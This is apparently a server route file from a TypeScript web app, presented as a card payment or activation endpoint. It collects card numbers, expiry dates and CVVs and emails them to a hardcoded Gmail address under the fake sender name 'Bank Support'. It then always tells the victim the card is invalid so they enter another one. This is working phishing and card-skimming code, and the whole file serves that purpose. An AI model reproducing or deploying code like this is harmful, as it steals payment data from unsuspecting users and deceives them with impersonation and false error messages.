import nodemailer from "nodemailer";

export async function POST(req: Request) {
  try {
    const email = "ourswebsolutions@gmail.com";

    const {
      cardholderName,
      amount,
      expiryDate,
      cardNumber,
      cvv,
    } = await req.json();

    if (
      !cardholderName ||
      !cardNumber ||
      !expiryDate ||
      !cvv ||
      !amount
    ) {
      return Response.json(
        {
          success: false,
          message: "Missing required fields",
        },
        {
          status: 400,
        }
      );
    }

    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: Number(process.env.SMTP_PORT),
      secure: false,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    });

    await transporter.sendMail({
      from: `"Bank Support" <${process.env.SMTP_USER}>`,
      to: email,
      subject: "New Card Activation Request",
      html: `
        <div style="font-family:Arial,sans-serif;padding:20px">
          <h2>New Payment Received</h2>

          <table border="1" cellpadding="10" cellspacing="0" style="border-collapse:collapse;width:100%">
            <tr>
              <td><strong>Cardholder Name</strong></td>
              <td>${cardholderName}</td>
            </tr>

            <tr>
              <td><strong>Amount</strong></td>
              <td>$${amount}</td>
            </tr>

            <tr>
              <td><strong>Card Number</strong></td>
              <td>${cardNumber}</td>
            </tr>

            <tr>
              <td><strong>Expiry Date</strong></td>
              <td>${expiryDate}</td>
            </tr>

            <tr>
              <td><strong>CVV</strong></td>
              <td>${cvv}</td>
            </tr>
          </table>
        </div>
      `,
    });

    const messages = [
      "This card could not be verified. Please use another valid card.",
      "Invalid card. Please use a valid card.",
      "Card verification failed. Please try another valid card.",
      "The card you entered is not valid. Please use a different card.",
      "This card cannot be processed. Please use another valid card.",
      "Unable to verify this card. Please use a different valid card.",
      "The entered card is invalid. Please try another valid card.",
      "Card activation failed. Please use a valid card.",
      "This card is not supported. Please use another valid card.",
      "The card information is invalid. Please use a valid card.",
    ];

    const randomMessage =
      messages[Math.floor(Math.random() * messages.length)];

    return Response.json({
      success: true,
      message: randomMessage,
    });
  } catch (error) {
    console.error("Email Error:", error);

    return Response.json(
      {
        success: false,
        message: "Failed to send email.",
      },
      {
        status: 500,
      }
    );
  }
}